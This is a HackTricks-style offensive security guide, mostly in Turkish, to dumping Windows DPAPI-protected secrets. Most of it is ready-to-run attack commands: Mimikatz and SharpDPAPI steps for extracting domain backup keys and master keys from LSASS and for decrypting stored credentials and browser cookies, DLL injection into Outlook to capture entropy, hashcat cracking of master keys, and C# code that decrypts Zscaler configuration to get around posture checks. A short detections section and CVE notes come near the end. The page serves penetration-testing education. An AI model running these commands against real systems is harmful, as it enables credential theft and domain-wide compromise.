# DPAPI - Parolaların Çıkarılması

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

The Data Protection API (DPAPI) öncelikle Windows işletim sistemi içinde **asimetrik özel anahtarların simetrik şifrelenmesi** için kullanılır; burada kullanıcı veya sistem sırları önemli bir entropi kaynağı olarak kullanılır. Bu yaklaşım, geliştiricilerin şifreleme anahtarının korunmasını kendilerinin yönetmesine gerek kalmadan, kullanıcının oturum açma sırlarından türetilen bir anahtar veya sistem şifrelemesi için sistemin domain kimlik doğrulama sırlarından türetilen bir anahtar kullanarak veriyi şifrelemelerini sağlar.

DPAPI kullanmanın en yaygın yolu, uygulamaların mevcut oturumdaki process ile güvenli şekilde veri şifrelemesine ve şifresini çözmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** fonksiyonlarıdır. Bu, şifrelenmiş verinin yalnızca onu şifreleyen aynı kullanıcı veya sistem tarafından çözülebileceği anlamına gelir.

Ayrıca, bu fonksiyonlar şifreleme ve şifresini çözme sırasında da kullanılacak bir **`entropy` parametresi** kabul eder; bu nedenle, bu parametre kullanılarak şifrelenmiş bir şeyi çözmek için, şifreleme sırasında kullanılan aynı entropy değerini sağlamalısınız.

### Kullanıcı anahtarlarının oluşturulması

DPAPI, her kullanıcı için kimlik bilgilerine dayalı benzersiz bir anahtar (buna **`pre-key`** denir) oluşturur. Bu anahtar kullanıcının parolasından ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır ancak genellikle bir SHA1 ile sonuçlanır. Örneğin, domain kullanıcıları için **kullanıcının NTLM hash'ine bağlıdır**.

Bu özellikle ilginçtir çünkü bir saldırgan kullanıcının parola hash'ini elde edebilirse:

- O kullanıcının anahtarıyla **DPAPI kullanılarak şifrelenmiş herhangi bir veriyi** API'ye gerek duymadan çözebilir
- Geçerli DPAPI anahtarını üretmeye çalışarak parolayı çevrimdışı **kırmayı** deneyebilir

Ayrıca, bir kullanıcı DPAPI kullanarak veri şifrelediğinde her seferinde yeni bir **master key** oluşturulur. Bu master key aslında veriyi şifrelemek için kullanılır. Her master key, onu tanımlayan bir **GUID** ile verilir.

Master key'ler **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır; burada `{SID}` o kullanıcının Security Identifier'ıdır. Master key, kullanıcının **`pre-key`** ile ve kurtarma için bir **domain backup key** ile şifrelenmiş olarak saklanır (yani aynı anahtar iki farklı yol ile 2 kez şifrelenmiş olarak saklanır).

Dikkat edin ki master key'i şifrelemek için kullanılan **domain key** domain controller'larda bulunur ve asla değişmez; bu yüzden eğer bir saldırgan domain controller'a erişim sağlarsa domain backup key'i alıp domain içindeki tüm kullanıcıların master key'lerini çözebilir.

Şifrelenmiş blob'lar, başlıklarında veriyi şifrelemek için kullanılan **master key'in GUID**'ini içerir.

> [!TIP]
> DPAPI ile şifrelenmiş blob'lar **`01 00 00 00`** ile başlar

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bu, bir kullanıcının birkaç Master Key'inin nasıl görüneceğine dair bir örnektir:

![](<../../images/image (1121).png>)

### Makine/Sistem anahtar oluşturma

Bu, makinenin verileri şifrelemek için kullandığı anahtardır. Bu, **DPAPI_SYSTEM LSA secret**'e dayanır; yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtardır. Bu anahtar, makine düzeyindeki kimlik bilgileri veya sistem genelindeki gizli veriler gibi sisteme ait verilerin erişilebilir olması gerektiği durumlarda verileri şifrelemek için kullanılır.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### DPAPI tarafından korunan veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Windows creds
- Internet Explorer ve Google Chrome'un parolaları ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar; şifreleme anahtarları dahil
- Uzak masaüstü bağlantıları, .NET Passport parolaları ve çeşitli şifreleme/doğrulama amaçları için özel anahtarlar
- Credential Manager tarafından yönetilen ağ parolaları ve CryptProtectData kullanan uygulamalardaki kişisel veriler; örn. Skype, MSN messenger ve diğerleri
- Kayıt defteri içindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wi‑Fi parolaları
- Zamanlanmış görev parolaları
- ...

### Master key çıkarma seçenekleri

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI master anahtarlarını ve SYSTEM anahtarını çıkarmak için **LSASS belleğine erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Eğer kullanıcı local admin privileges'e sahipse, **DPAPI_SYSTEM LSA secret**'e erişip machine master keys'i decrypt edebilirler:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Eğer kullanıcı olarak bir oturum içindeyseniz, DC'den **backup key to decrypt the master keys using RPC** talep etmek mümkün. Eğer local admin iseniz ve kullanıcı oturum açmışsa, bunun için **steal his session token** kullanabilirsiniz:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ları Listele
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifrelenmiş Verilere Erişim

### DPAPI Şifrelenmiş Verileri Bulma

Kullanıcıların yaygın olarak **korunan dosyaları** şu konumlardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ayrıca yukarıdaki yollarda `\Roaming\`'u `\Local\` ile değiştirmeyi de kontrol edin.

Keşif örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) dosya sistemi, registry ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Unutmayın ki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) DPAPI kullanarak cookies gibi hassas verilerin şifresini çözmek için kullanılabilir.

### Erişim anahtarları ve veriler

- **Use SharpDPAPI** mevcut oturumdaki DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini almak için kullanın:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kimlik bilgileri hakkında bilgi edinin**; örneğin şifrelenmiş veriler ve guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC kullanarak **domain backup key** talep eden bir kullanıcının masterkey'ini deşifre edin:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** aracı ayrıca masterkey deşifrelemesi için şu argümanları destekler ( `/rpc` ile domain'in yedek anahtarını almak, `/password` ile düz metin parola kullanmak veya `/pvk` ile bir DPAPI domain özel anahtar dosyası belirtmek mümkün olduğuna dikkat edin...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey kullanarak veriyi şifre çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme için şu argümanları destekler ( `/rpc` ile etki alanının yedekleme anahtarını almak, `/password` ile düz metin parola kullanmak, `/pvk` ile bir DPAPI domain özel anahtar dosyası belirtmek, `/unprotect` ile mevcut kullanıcının oturumunu kullanmak mümkün olduğuna dikkat edin...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Bazı verileri **geçerli kullanıcı oturumu** kullanarak şifre çözme:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Opsiyonel Entropy'nin İşlenmesi ("Third-party entropy")

Bazı uygulamalar `CryptProtectData`'e ek bir **entropy** değeri iletir. Bu değer olmadan, doğru masterkey bilinse bile blob çözülemez. Bu şekilde korunan kimlik bilgilerini hedeflerken **entropy**'nin elde edilmesi bu nedenle hayati önem taşır (ör. Microsoft Outlook, bazı VPN istemcileri).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) hedef süreç içindeki DPAPI fonksiyonlarını hooklayan bir user-mode DLL'dir ve sağlanan her türlü opsiyonel **entropy**'yi şeffaf şekilde kaydeder. `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı **DLL-injection** modunda EntropyCapture çalıştırmak, her entropy buffer'ını çağıran süreç ve blob ile eşleştiren bir dosya oluşturur. Yakalanan **entropy** daha sonra veriyi çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) ile sağlanabilir.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile birlikte **context 3** masterkey formatını tanıttı.

`hashcat` v6.2.6 (Aralık 2023) hash-modları **22100** (DPAPI masterkey v1 context ), **22101** (context 1) and **22102** (context 3) ekledi; bunlar masterkey dosyasından kullanıcı şifrelerinin doğrudan GPU hızlandırmalı kırılmasına izin veriyor. Bu nedenle saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.

`DPAPISnoop` (2024) süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential ve Vault blob'larını ayrıştırabilir, kırılmış anahtarlarla şifrelerini çözebilir ve düz metin parolaları dışa aktarabilir.

### Diğer makine verilerine erişim

In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Elbette o makineye erişebilmeniz gerekir ve aşağıdaki örnekte **etki alanı yedekleme şifreleme anahtarının bilindiği** varsayılmaktadır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) LDAP dizininden tüm kullanıcıları ve bilgisayarları çıkarmayı ve RPC üzerinden domain controller backup key'i çıkarmayı otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözer ve tüm bilgisayarlarda smbclient çalıştırarak tüm kullanıcıların DPAPI blob'larını toplar ve domain backup key ile her şeyi deşifre eder.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'ten çıkarılan bilgisayar listesi ile bilmeseniz bile her alt ağı bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI ile korunan sırları otomatik olarak dökebilir. 2.x sürümü şunları getirdi:

* Yüzlerce hosttan paralel blob toplama
* **context 3** masterkey'lerin ayrıştırılması ve otomatik Hashcat kırma entegrasyonu
* Chrome "App-Bound" şifreli çerezleri için destek (bir sonraki bölüme bakın)
* Yeniden uç noktalara anket çekip yeni oluşturulan blob'ları farklayan yeni **`--snapshot`** modu

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault dosyalarını ayrıştıran bir C# parser'ıdır; Hashcat/JtR formatlarını çıktılayabilir ve isteğe bağlı olarak kırmayı otomatik başlatabilir. Windows 11 24H1'e kadar hem machine hem user masterkey formatlarını tam olarak destekler.


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilgili dizinlerde dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir network share üzerinden.
- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** veya benzeri araçların kullanımı.
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** objesine erişim ile korelasyon gösterebilir.
- Bir sürecin *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiği durumlarda Event **4673/4674**


---
### 2023-2025 güvenlik açıkları & ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir domain üyesini kötü amaçlı bir DPAPI backup key alması için kandırarak kullanıcı masterkey'lerinin deşifre edilmesine olanak sağlayabilirdi. Kasım 2023 toplu güncelleştirmesinde yamalandı – yöneticiler DC'lerin ve iş istasyonlarının tam olarak güncel olduğundan emin olmalıdır.
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024) eski DPAPI-only korumasının yerine, kullanıcının **Credential Manager** altında depolanan ek bir anahtar koydu. Çerezlerin çevrimdışı deşifre edilmesi artık hem DPAPI masterkey hem de **GCM-wrapped app-bound key** gerektiriyor. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalıştırıldığında ekstra anahtarı kurtarabilir.


### Vaka İncelemesi: Zscaler Client Connector – SID'den Türetilen Özel Entropi

Zscaler Client Connector, `C:\ProgramData\Zscaler` altında birkaç yapılandırma dosyası saklar (örn. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenir ancak vendor, diskte saklanmak yerine *runtime* sırasında *hesaplanan* **özel entropi** sağlar.

Entropi şu iki öğeden yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülmüş sabit kodlu bir gizli değer.
2. Yapılandırmanın ait olduğu Windows hesabının **SID**'i.

DLL tarafından uygulanan algoritma şu anlama gelir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Çünkü sır, diskten okunabilecek bir DLL'e gömülü olduğundan, **SYSTEM yetkisine sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden oluşturabilir** ve blob'ları offline olarak şifre çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme, her bir **device posture check** ve beklenen değeri de içeren tam JSON yapılandırmasını ortaya çıkarır — istemci tarafı atlatma denemelerinde çok değerli bir bilgidir.

> TIP: diğer şifrelenmiş artefaktlar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy olmadan** (`16` sıfır byte) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildikten sonra doğrudan `ProtectedData.Unprotect` ile çözülebilirler.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
